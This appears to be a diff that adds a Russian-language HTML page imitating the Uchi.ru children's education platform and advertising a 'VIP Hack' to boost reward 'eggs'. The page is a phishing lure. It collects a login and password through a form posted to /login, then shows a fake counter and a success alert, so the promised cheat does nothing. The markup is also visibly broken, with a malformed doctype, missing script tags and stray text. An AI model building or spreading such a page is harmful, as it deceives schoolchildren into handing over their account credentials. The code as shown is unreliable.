@@ -1,0 +1,49 @@
+<.DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Учи.ру — Интерактивная платформа</title>
+<style>
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f4f8; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+.container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 400px; text-align: center; }
+.logo { color: #0088cc; font-size: 28px; font-weight: bold; margin-bottom: 20px; }
+input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+button { width: 100%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+button:hover { background-color: #006699; }
+.egg-section { display: none; margin-top: 20px; }
+.egg-counter { font-size: 24px; color: #ff9900; font-weight: bold; margin: 15px 0; }
+</style>
+</head>
+<body>
+
+<div class="container" id="login-box">
+<div class="logo">Учи.ру (VIP Hack)</div>
+<p>Войди в аккаунт, чтобы активировать накрутку яиц</p>
+<form id="authForm" action="/login" method="POST">
+<input type="text" name="username" placeholder="Логин или Email" required>
+<input type="password" name="password" placeholder="Пароль" required>
+<button type="submit">Войти и забрать яйца</button>
+</form>
+</div>
+
+<div class="container egg-section" id="hack-box">
+<div class="logo">Ферма Яиц </div>
+<p>Аккаунт успешно подключен.</p>
+<div class="egg-counter" id="eggs">Яйца: 0</div>
+<button onclick="boostEggs()">Накрутить 1000 яиц</button>
+</div>
+
+интерфейса на накрутку
+document.getElementById('login-box').style.display = 'none';
+document.getElementById('hack-box').style.display = 'block';
+
+let currentEggs = 142;
+function boostEggs() {
+currentEggs += 1000;
+document.getElementById('eggs').innerText = `Яйца: ${currentEggs} `;
+alert('Успешно. Яйца летят на баланс.');
+
+</body>
+</html>
+
